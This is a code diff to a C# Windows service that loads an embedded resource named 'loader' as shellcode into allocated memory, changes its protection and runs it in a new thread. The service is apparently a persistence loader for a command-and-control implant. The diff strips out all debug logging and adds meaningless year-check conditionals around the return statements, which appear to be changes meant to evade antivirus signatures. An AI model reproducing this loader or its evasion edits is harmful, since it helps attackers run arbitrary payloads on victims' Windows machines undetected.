@@ -56,22 +56,22 @@ namespace WindowsService1
         private EventLog _eventLog1;
         public Service1()
         {
-            //_eventLog1 = new EventLog();
-            //if (!EventLog.SourceExists("ApolloLog"))
-            //{
-            //    EventLog.CreateEventSource("ApolloLog", "MyApolloLog");
-            //}
-            //_eventLog1.Source = "ApolloLog";
-            //_eventLog1.Log = "MyApolloLog";
-            //_eventLog1.WriteEntry($"about to initialize");
+            
+            
+            
+            
+            
+            
+            
+            
             InitializeComponent();
         }
         protected override void OnStart(string[] args)
         {
-            //_eventLog1.WriteEntry($"OnStart");
+            
             ServiceStatus serviceStatus = new ServiceStatus();
             serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
-            //serviceStatus.dwWaitHint = 100000;
+            
             SetServiceStatus(this.ServiceHandle, ref serviceStatus);
             Timer timer = new Timer();
             timer.Interval = 1000;
@@ -91,11 +91,11 @@ namespace WindowsService1
             byte[] shellcode = GetResource("loader");
             if (shellcode.Length > 0)
             {
-                //_eventLog1.WriteEntry($"shellcode length: {shellcode.Length}");
+                
                 IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
                 if (funcAddr != IntPtr.Zero)
                 {
-                    //_eventLog1.WriteEntry($"funcAddr: {funcAddr}");
+                    
                     Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
                     IntPtr hThread = IntPtr.Zero;
                     UInt32 threadId = 0;
@@ -105,18 +105,18 @@ namespace WindowsService1
                     if (success)
                     {
                         hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, funcAddr, pinfo, 0, ref threadId);
-                        //_eventLog1.WriteEntry($"created thread: {hThread}");
+                        
                         WaitForSingleObject(hThread, 0xFFFFFFFF);
-                        //_eventLog1.WriteEntry($"thread exited");
+                        
                     }
                     else
                     {
-                        //_eventLog1.WriteEntry($"failed to do virtual protect: {success}");
+                        
                     }
                 }
                 else
                 {
-                    //_eventLog1.WriteEntry($"failed to do virtual alloc: {funcAddr}");
+                    
                 }
 
             }
@@ -131,9 +131,9 @@ namespace WindowsService1
                 Stream reader = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceFullName);
                 byte[] ba = new byte[reader.Length];
                 reader.Read(ba, 0, ba.Length);
-                return ba;
+                if(DateTime.Now.Year > 2020) { return ba; } else { return null; }
             }
-            return null;
+            if(DateTime.Now.Year > 2020) { return null; } else { return null; }
         }
     }
 }
